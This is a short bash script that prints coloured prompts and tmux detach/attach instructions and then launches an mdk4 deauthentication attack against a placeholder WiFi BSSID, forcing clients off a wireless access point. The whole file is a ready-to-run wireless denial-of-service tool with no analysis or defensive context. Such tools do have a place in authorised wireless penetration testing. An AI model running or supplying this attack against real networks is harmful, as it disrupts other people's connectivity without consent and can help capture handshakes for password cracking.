#!/bin/bash
echo ""
echo -e ${green}"Deauthing BSSID"{clear}
echo ""
sleep 2
echo -e ${yellow}"Use CTRL +B Then Press D To Detach From Session"${clear}
echo ""
sleep 2
echo -e ${yellow}"Use tmux attach-session -t deauth To Come Back To This Session"${clear}
echo ""
mdk4 DEAUTH d -B BSSID
